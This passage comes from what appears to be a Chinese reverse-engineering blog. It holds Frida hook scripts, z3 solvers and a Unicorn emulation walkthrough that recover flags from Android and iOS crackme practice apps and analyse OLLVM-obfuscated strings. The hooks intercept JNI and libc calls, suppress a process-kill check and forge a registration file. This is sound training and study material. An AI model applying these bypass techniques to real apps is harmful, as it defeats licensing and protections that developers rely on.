&quot;RkxBR3s1N0VSTDFOR180UkNIM1J9Cg==&quot;;</span><br><span class="line">        &#125;;</span><br><span class="line">        //hook 构造函数</span><br><span class="line">        var a_init = Java.use(&quot;com.tlamb96.kgbmessenger.b.a&quot;);</span><br><span class="line">        a_init.$init.implementation = function(i, str, str2, z)&#123;</span><br><span class="line">            this.$init(i, str, str2, z);</span><br><span class="line">            console.log(&quot;a_init_arg:&quot;,i, str, str2, z);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        var decode_class = Java.use(&quot;com.example.mytest.Decode&quot;);</span><br><span class="line">        console.log(&quot;decode:&quot;+decode_class.decode_p());</span><br><span class="line">        console.log(&quot;r2hex:&quot;+decode_class.s2hex());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<p>z3求解，hook_l2.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">from binascii import *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">r = &quot;0064736c707d6f510020646b73247c4d0068202b4159516700502a214d24675100&quot;</span><br><span class="line">charArray = bytearray(a2b_hex(r))</span><br><span class="line">print charArray</span><br><span class="line"></span><br><span class="line">for i2 in range(len(charArray)/2):</span><br><span class="line">    c = charArray[i2]</span><br><span class="line">    charArray[i2] = charArray[len(charArray) - i2 - 1]</span><br><span class="line">    charArray[(len(charArray) - i2) - 1] = c</span><br><span class="line"></span><br><span class="line">print b2a_hex(charArray)</span><br><span class="line"></span><br><span class="line">x = [BitVec(&quot;a%s&quot; % i,32) for i in range(len(charArray))]</span><br><span class="line">for i in range(len(charArray)):</span><br><span class="line">    print x[i]</span><br><span class="line">    c = charArray[i]</span><br><span class="line">    print(i,hex(c))</span><br><span class="line">    s.add(((x[i] &gt;&gt; (i % 8)) ^ x[i]) == c)</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print m</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(len(charArray)):</span><br><span class="line">        if m[x[i]] != None:</span><br><span class="line">            flag += chr(m[x[i]].as_long().real)</span><br><span class="line">        else:</span><br><span class="line">            flag += &quot; &quot;</span><br><span class="line">    print &quot;|&quot;+flag+&quot;|&quot;</span><br></pre></td></tr></table></figure>
<h2 id="L3：-Frida-Hook-Native"><a href="#L3：-Frida-Hook-Native" class="headerlink" title="L3： Frida Hook Native"></a>L3： Frida Hook Native</h2><p>hook_l3.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var MyApp = Java.use(&quot;com.gdufs.xman.MyApp&quot;);</span><br><span class="line">        MyApp.saveSN.implementation = function(str)&#123;</span><br><span class="line">            console.log(&quot;savesn:&quot;,str);</span><br><span class="line">            this.saveSN(str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var proc = Java.use(&quot;android.os.Process&quot;);</span><br><span class="line">        proc.killProcess.implementation = function(pid)&#123;</span><br><span class="line">            console.log(&quot;kill pid:&quot;,pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native()</span><br><span class="line">&#123;</span><br><span class="line">    var base_jni = Module.findBaseAddress(&quot;libmyjni.so&quot;);</span><br><span class="line">    var n2 = Module.findExportByName(&quot;libmyjni.so&quot;,&quot;n2&quot;);</span><br><span class="line">    console.log(&quot;base:&quot;,base_jni,&quot; n2:&quot;,n2);</span><br><span class="line">    if (base_jni!=null) &#123;</span><br><span class="line">        Interceptor.attach(n2,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;n2 onEnter:&quot;,args[0],args[1],args[2]);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_libart()</span><br><span class="line">&#123;</span><br><span class="line">    //symbol   (no checkjni)</span><br><span class="line">    var module_libart = Process.findModuleByName(&quot;libart.so&quot;);</span><br><span class="line">    //or?const hooks = Module.load(&apos;libc.so&apos;);   var Symbol = hooks.enumerateSymbols();</span><br><span class="line">    var symbols = module_libart.enumerateSymbols();</span><br><span class="line">    </span><br><span class="line">    var addr_GetStringUTFChars = null;</span><br><span class="line">    var addr_FindClass = null;</span><br><span class="line">    var addr_GetStaticFieldID = null;</span><br><span class="line">    var addr_SetStaticIntField = null;</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; symbols.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (symbols[i].name.indexOf(&quot;art&quot;) != -1) &#123;</span><br><span class="line">            if (symbols[i].name.indexOf(&quot;CheckJNI&quot;) == -1) &#123;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStringUTFChars&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStringUTFChars = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStringUTFChars);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;art3JNI9FindClass&quot;) != -1) &#123;</span><br><span class="line">                    addr_FindClass = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_FindClass);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStaticFieldID&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStaticFieldID = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStaticFieldID);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;SetStaticIntField&quot;) != -1) &#123;</span><br><span class="line">                    addr_SetStaticIntField = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_SetStaticIntField);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //print str </span><br><span class="line">    </span><br><span class="line">    //print so stack  :  FUZZY and ACCURATE两种方式</span><br><span class="line">    if (addr_GetStringUTFChars) &#123;</span><br><span class="line">        Interceptor.attach(addr_GetStringUTFChars,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                // console.log(&apos;addr_GetStringUTFChars onEnter called from:\n&apos; +</span><br><span class="line">                //     Thread.backtrace(this.context, Backtracer.FUZZY)</span><br><span class="line">                //         .map(DebugSymbol.fromAddress).join(&apos;\n&apos;) + &apos;\n&apos;);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">                console.log(&quot;GetStringUTFChars:&quot;,ptr(retval).readCString())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (addr_FindClass) &#123;</span><br><span class="line">        Interceptor.attach(addr_FindClass,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;FindClass Arg:&quot;, ptr(args[1]).readCString());</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (addr_GetStaticFieldID) &#123;</span><br><span class="line">        Interceptor.attach(addr_GetStaticFieldID,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;GetStaticFieldID Arg3:&quot;, ptr(args[2]).readCString(),&quot;Arg4:&quot;,ptr(args[3]).readCString());</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (addr_SetStaticIntField) &#123;</span><br><span class="line">        Interceptor.attach(addr_SetStaticIntField,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;SetStaticIntField Arg4:&quot;,args[3]);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    //hook findclass getstaticfiledid </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_libc()</span><br><span class="line">&#123;</span><br><span class="line">    //strcmp(or hook lib import)</span><br><span class="line">    var addr_strcmp =  Module.findExportByName(&quot;libc.so&quot;,&quot;strcmp&quot;);</span><br><span class="line">    Interceptor.attach(addr_strcmp,&#123;</span><br><span class="line">        onEnter: function(args)&#123;</span><br><span class="line">            var str_dst = ptr(args[1]).readCString();</span><br><span class="line">            if (str_dst == &quot;EoPAoY62@ElRD&quot;) &#123;</span><br><span class="line">                console.log(&quot;strcmp:&quot;, ptr(args[0]).readCString(),</span><br><span class="line">                    ptr(args[1]).readCString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function writefile()</span><br><span class="line">&#123;   </span><br><span class="line">    //frida api write file</span><br><span class="line">        //frida 的api来写文件</span><br><span class="line">        var file = new File(&quot;/sdcard/reg.dat&quot;, &quot;w&quot;);</span><br><span class="line">        file.write(&quot;EoPAoY62@ElRD&quot;);</span><br><span class="line">        file.flush();</span><br><span class="line">        file.close();</span><br><span class="line">&#125;</span><br><span class="line">function writefile2()</span><br><span class="line">&#123;   </span><br><span class="line">    //frida native function write file</span><br><span class="line">    var addr_fopen =  Module.findExportByName(&quot;libc.so&quot;,&quot;fopen&quot;);</span><br><span class="line">    var addr_fputs =  Module.findExportByName(&quot;libc.so&quot;,&quot;fputs&quot;);</span><br><span class="line">    var addr_fclose =  Module.findExportByName(&quot;libc.so&quot;,&quot;fclose&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(&quot;addr file api:&quot;,addr_fopen,addr_fputs,addr_fclose);</span><br><span class="line"></span><br><span class="line">    var fopen = new NativeFunction(addr_fopen,&quot;pointer&quot;,[&quot;pointer&quot;,&quot;pointer&quot;]);</span><br><span class="line">    var fputs = new NativeFunction(addr_fputs,&quot;int&quot;,[&quot;pointer&quot;,&quot;pointer&quot;]);</span><br><span class="line">    var fclose = new NativeFunction(addr_fclose,&quot;int&quot;,[&quot;pointer&quot;]);</span><br><span class="line"></span><br><span class="line">    var filename = Memory.allocUtf8String(&quot;/sdcard/reg.dat&quot;);</span><br><span class="line">    var open_type = Memory.allocUtf8String(&quot;w+&quot;);</span><br><span class="line">    var handle = fopen(filename,open_type);</span><br><span class="line"></span><br><span class="line">    var buffer = Memory.allocUtf8String(&quot;EoPAoY62@ElRD&quot;);</span><br><span class="line">    var ret = fputs(buffer,handle);</span><br><span class="line">    fclose(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">    hook_native();</span><br><span class="line">    hook_libart();</span><br><span class="line">    hook_libc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<p>z3 求解hook_l3.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">r = &quot;EoPAoY62@ElRD&quot;</span><br><span class="line">v13 = &quot;W3_arE_whO_we_ARE&quot;</span><br><span class="line">x = [BitVec(&quot;a%s&quot; % i,8) for i in range(len(r))]</span><br><span class="line">v9 = 2016</span><br><span class="line">v11 = 0</span><br><span class="line">for i in range(len(r)):</span><br><span class="line">    if i %3 == 1:</span><br><span class="line">        v9 = (v9 + 5) % 16</span><br><span class="line">        v11 = v13[v9 + 1]</span><br><span class="line">    elif i %3 == 2:</span><br><span class="line">        v9 = (v9 + 7) % 15</span><br><span class="line">        v11 = v13[v9 + 2]</span><br><span class="line">    else :</span><br><span class="line">        v9 = (v9 + 3) % 13</span><br><span class="line">        v11 = v13[v9 + 3]</span><br><span class="line">    print r[i],v11</span><br><span class="line">    s.add((x[i] ^ ord(v11)) == ord(r[i]))</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print m</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(len(r)):</span><br><span class="line">        if m[x[i]] != None:</span><br><span class="line">            flag += chr(m[x[i]].as_long().real)</span><br><span class="line">        else:</span><br><span class="line">            flag += &quot; &quot;</span><br><span class="line">    print &quot;|&quot;+flag+&quot;|&quot;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol>
<li>打印SO调用栈时选FUZZY（模糊方式）与ACCURATE（准确方式）的区别。</li>
<li>重写函数中调用非静态函数达到与主动调用choose方式同样的目的。</li>
<li>Frida调用自定义的dex（jar转dex）。<br>附件下载：<a href="samples.zip" target="_blank">链接</a></li>
</ol>
]]></content>
      <categories>
        <category>移动终端</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-03-01-使用Unicorn模拟运行破解简单的IOS-IPA-Crackme</title>
    <url>/2021/03/01/2021-03-01-%E4%BD%BF%E7%94%A8Unicorn%E6%A8%A1%E6%8B%9F%E8%BF%90%E8%A1%8C%E7%A0%B4%E8%A7%A3%E7%AE%80%E5%8D%95%E7%9A%84IOS-IPA-Crackme/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;IPA是Apple程序应用文件iPhoneApplication的缩写。苹果手机上ios系统上安装开发的app，首先要将项目打包成ipa文件。利用IDA静态分析以及Unicorn的模拟执行功能，可以在没有ios调试环境的情况下对ios app开展静态分析以及模拟动态执行工作。
</blockquote>
<a id="more"></a>
<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>UnCrackable_Level1.ipa 为需要分析的目标程序，位置为测试虚拟机环境中的桌面文件夹，同目录下的wp文件夹中存放实验用的wp脚本。</p>
<ol>
<li>首先根据ipa包的文件格式获取其主程序文件，选择使用Winrar对ipa包进行解压，将其解压到默认桌面文件夹。</li>
</ol>
<div align="center">

<p><img src="1.png" alt="1"></p>
</div>
得到Payload\UnCrackable Level 1.app目录中的主程序文件“UnCrackable Level 1”。

<ol start="2">
<li>使用桌面中的IDA程序打开“UnCrackable Level 1”，打开方式选择Math-O(arm64)方式。<div align="center">

</li>
</ol>
<p><img src="2.png" alt="2"></p>
</div>

<ol start="3">
<li><p>根据IDA识别的按钮点击事件的处理流程，可以定位到Flag字符串的处理函数。</p>
<div align="center">

<p><img src="3.png" alt="3"></p>
</div>
也可以通过字符串搜索方式定位到Flag的验证处理流程：
<div align="center">

<p><img src="4.png" alt="4"></p>
</div>
利用引用地址同样定位到buttonclick处理函数代码：
<div align="center">

<p><img src="5.png" alt="5"></p>
</div>
</li>
<li><p>下面继续分析该函数的处理流程，使用F5获取伪代码显示。</p>
<div align="center">

<p><img src="6.png" alt="6">    </p>
</div>
分析处理流程为输入框中输入的Flag字符串与thelabel标签标识的字符串相比较，比较相等成功之后则弹出Flag验证正确的提示。
</li>
<li><p>实际上程序运行后是无法看到thelabel标签标识的字符串的，需要跟进程序中视图加载时对该标签的处理过程查看到标签实际的字符串值。使用IDA查看viewDidLoad函数的代码：</p>
<div align="center">

<p><img src="7.png" alt="7"></p>
</div>
可以看到thelabel标签的字符串值实际上是由sub_1000080D4函数处理后返回.同时可以看到程序中设置该标签为隐藏属性.
</li>
<li><p>跟进分析sub_1000080D4函数的实现过程。</p>
<div align="center">

<p><img src="8.png" alt="8"></p>
</div>
该函数功能为对字符串缓冲区逐字节进行运算赋值,最终返回运算完之后的字符串.
</li>
<li><p>因为直接通过静态分析得到最终返回的字符串值较为复杂,可以考虑使用Unicorn模拟执行的方式对sub_1000080D4函数进行仿真,并获取其最终返回的字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding=utf8</span><br><span class="line">from unicorn import *</span><br><span class="line">from unicorn.arm64_const import *</span><br><span class="line"></span><br><span class="line">ImageBase = 0x0</span><br><span class="line">ImageSize = 0x100000</span><br><span class="line">StackBase = 0x200000</span><br><span class="line">StackSize = 0x100000</span><br><span class="line">StackTop = StackBase + StackSize - 0x10</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    mu = Uc(UC_ARCH_ARM64,UC_MODE_ARM)</span><br><span class="line">    mu.mem_map(ImageBase,ImageSize)</span><br><span class="line">    bin = open(&quot;UnCrackable Level 1&quot;,&quot;rb&quot;).read()</span><br><span class="line">    mu.mem_write(ImageBase,bin)</span><br><span class="line"></span><br><span class="line">    mu.mem_map(StackBase,StackSize)</span><br><span class="line">    mu.reg_write(UC_ARM64_REG_SP,StackTop)</span><br><span class="line"></span><br><span class="line">    target_begin = ImageBase + 0x240D4</span><br><span class="line">    target_end = ImageBase + 0x24154</span><br><span class="line">    mu.emu_start(target_begin,target_end)</span><br><span class="line">    print(&quot;Done...&quot;)</span><br><span class="line"></span><br><span class="line">    x0 = mu.reg_read(UC_ARM64_REG_X0)</span><br><span class="line">    result = mu.mem_read(x0,16)</span><br><span class="line">    print(&apos;Flag:&apos; + result.decode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">except UcError as e:</span><br><span class="line">    print(&quot;ERROR:%s&quot; %e)</span><br></pre></td></tr></table></figure>
<p>该段代码的主要功能为利用Unicorn申请代码缓存及栈空间,对指定的sub_1000080D4函数代码起始位置(0x240D4)和结束位置(0x24154)进行仿真,最终取回返回值也即是寄存器X0指向的内存空间.注意因为镜像申请的空间为自定义的基地址0,代码实际所在的位置需要进行确认,</p>
<div align="center">

<p><img src="9.png" alt="9"></p>
</div></li>
<li><p>将”UnCrackable Level 1”文件拷贝到wp脚本所在目录,并执行wp脚本获取返回字符串值,即为Flag字符串.</p>
<div align="center">

<p><img src="10.png" alt="10"></p>
</div>

</li>
</ol>
<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>ios ipa逆向基础知识以及Unicorn框架的使用方法。</p>
]]></content>
      <categories>
        <category>移动终端</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-06-05-Frida辅助分析OLLVM混淆的算法</title>
    <url>/2020/06/05/2020-06-05-Frida%E8%BE%85%E5%8A%A9%E5%88%86%E6%9E%90OLLVM%E6%B7%B7%E6%B7%86%E7%9A%84%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>看雪的安卓培训网课例子动手做了一遍，记录下Frida辅助分析OLLVM混淆的相关方法，，（自己记录总结备忘用的，详细的讲解还是推荐去听看雪的课，附件先暂不提供下载）。</p>
</blockquote>
<a id="more"></a>
<h2 id="L4：-Frida-辅助分析OLLVM字符串混淆"><a href="#L4：-Frida-辅助分析OLLVM字符串混淆" class="headerlink" title="L4： Frida 辅助分析OLLVM字符串混淆"></a>L4： Frida 辅助分析OLLVM字符串混淆</h2><p>hook_l4.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function print_str(addr)</span><br><span class="line">&#123;</span><br><span class="line">    var base_libjni = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var addr_str = base_libjni.add(addr);</span><br><span class="line">    console.log(&quot;str:&quot;,addr_str,ptr(addr_str).readCString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native_001()</span><br><span class="line">&#123;</span><br><span class="line">    //v6 = off_33D60,</span><br><span class="line">    print_str(0x37070);</span><br><span class="line">    print_str(0x37080);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print_str(0x37010);</span><br><span class="line">    print_str(0x37050);</span><br><span class="line">    print_str(0x370A8);</span><br><span class="line">    print_str(0x370C0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native_002()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // *(_QWORD *)&amp;v6 = byte_3E1BA;</span><br><span class="line">    // *((_QWORD *)&amp;v6 + 1) = sub_6E4C;</span><br><span class="line">    // *(_QWORD *)&amp;xmmword_3E1E8 = &amp;dword_3E1B4;</span><br><span class="line">    // *(__int128 *)((char *)&amp;xmmword_3E1E8 + 8) = v6;</span><br><span class="line">    print_str(0x3E1B4);</span><br><span class="line">    print_str(0x3E1BA);</span><br><span class="line">&#125;</span><br><span class="line">function hook_libart()</span><br><span class="line">&#123;</span><br><span class="line">    //symbol   (no checkjni)</span><br><span class="line">    var module_libart = Process.findModuleByName(&quot;libart.so&quot;);</span><br><span class="line">    //or?const hooks = Module.load(&apos;libc.so&apos;);   var Symbol = hooks.enumerateSymbols();</span><br><span class="line">    var symbols = module_libart.enumerateSymbols();</span><br><span class="line">    </span><br><span class="line">    var addr_GetStringUTFChars = null;</span><br><span class="line">    var addr_FindClass = null;</span><br><span class="line">    var addr_GetStaticFieldID = null;</span><br><span class="line">    var addr_SetStaticIntField = null;</span><br><span class="line">    var addr_RegisterNatives = null;</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; symbols.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (symbols[i].name.indexOf(&quot;art&quot;) != -1) &#123;</span><br><span class="line">            if (symbols[i].name.indexOf(&quot;CheckJNI&quot;) == -1) &#123;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStringUTFChars&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStringUTFChars = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStringUTFChars);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;art3JNI9FindClass&quot;) != -1) &#123;</span><br><span class="line">                    addr_FindClass = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_FindClass);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStaticFieldID&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStaticFieldID = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStaticFieldID);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;SetStaticIntField&quot;) != -1) &#123;</span><br><span class="line">                    addr_SetStaticIntField = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_SetStaticIntField);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;RegisterNatives&quot;) != -1) &#123;</span><br><span class="line">                    addr_RegisterNatives = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_RegisterNatives);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //print str </span><br><span class="line">    </span><br><span class="line">    // //print so stack  :  FUZZY and ACCURATE</span><br><span class="line">    // if (addr_GetStringUTFChars) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_GetStringUTFChars,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             // console.log(&apos;addr_GetStringUTFChars onEnter called from:\n&apos; +</span><br><span class="line">    //             //     Thread.backtrace(this.context, Backtracer.FUZZY)</span><br><span class="line">    //             //         .map(DebugSymbol.fromAddress).join(&apos;\n&apos;) + &apos;\n&apos;);</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //             console.log(&quot;GetStringUTFChars:&quot;,ptr(retval).readCString())</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // if (addr_FindClass) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_FindClass,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             console.log(&quot;FindClass Arg:&quot;, ptr(args[1]).readCString());</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // if (addr_GetStaticFieldID) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_GetStaticFieldID,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             console.log(&quot;GetStaticFieldID Arg3:&quot;, ptr(args[2]).readCString(),&quot;Arg4:&quot;,ptr(args[3]).readCString());</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // if (addr_SetStaticIntField) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_SetStaticIntField,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             console.log(&quot;SetStaticIntField Arg4:&quot;,args[3]);</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    // //hook findclass getstaticfiledid </span><br><span class="line">    if (addr_RegisterNatives) &#123;</span><br><span class="line">        Interceptor.attach(addr_RegisterNatives,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;addr_RegisterNatives:\n&quot;,hexdump(args[2]));</span><br><span class="line">                console.log(&quot;addr_RegisterNatives name:&quot;,ptr(args[2]).readPointer().readCString());</span><br><span class="line">                console.log(&quot;addr_RegisterNatives sign:&quot;,ptr(args[2]).add(Process.pointerSize).readPointer().readCString());</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">function inline_hook()</span><br><span class="line">&#123;</span><br><span class="line">    //arm64稳定  arm32不稳定，x32可能会有2字节的thumb指令</span><br><span class="line">    var base_libjni = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    console.log(&quot;base_libjni&quot;,base_libjni);</span><br><span class="line">    if (base_libjni != null) &#123;</span><br><span class="line">        var addr_hook = base_libjni.add(0x7320);</span><br><span class="line">        Interceptor.attach(addr_hook,&#123;</span><br><span class="line">            onEnter : function (args)&#123;</span><br><span class="line">                //w13 x13</span><br><span class="line">                console.log(&quot;xor:&quot;,this.context.x13);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_dlopen()</span><br><span class="line">&#123;</span><br><span class="line">    //android 6.0</span><br><span class="line">    var addr_dlopen = Module.findExportByName(null,&quot;dlopen&quot;);</span><br><span class="line">    Interceptor.attach(addr_dlopen,&#123;</span><br><span class="line">        onEnter : function (args)&#123;</span><br><span class="line">            this.flag = false;</span><br><span class="line">            var dlopen_name = ptr(args[0]).readCString();</span><br><span class="line">            console.log(&quot;android_dlopen_ext:&quot;,dlopen_name);</span><br><span class="line">            if(dlopen_name.indexOf(&quot;libhello-jni.so&quot;) &gt;= 0)&#123;</span><br><span class="line">                this.flag = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave : function(retval)&#123;</span><br><span class="line">            if(this.flag)&#123;</span><br><span class="line">                inline_hook();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    // 高版本Android系统</span><br><span class="line">    var addr_android_dlopen_ext = Module.findExportByName(null,&quot;android_dlopen_ext&quot;);</span><br><span class="line">    Interceptor.attach(addr_android_dlopen_ext,&#123;</span><br><span class="line">        onEnter : function (args)&#123;</span><br><span class="line">            this.flag = false;</span><br><span class="line">            var dlopen_name = ptr(args[0]).readCString();</span><br><span class="line">            console.log(&quot;android_dlopen_ext:&quot;,dlopen_name);</span><br><span class="line">            if(dlopen_name.indexOf(&quot;libhello-jni.so&quot;) &gt;= 0)&#123;</span><br><span class="line">                this.flag = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave : function(retval)&#123;</span><br><span class="line">            if(this.flag)&#123;</span><br><span class="line">                inline_hook();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_dlopen()</span><br><span class="line">    hook_libart()</span><br><span class="line">    //hook_native_001();</span><br><span class="line">    //hook_native_002();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
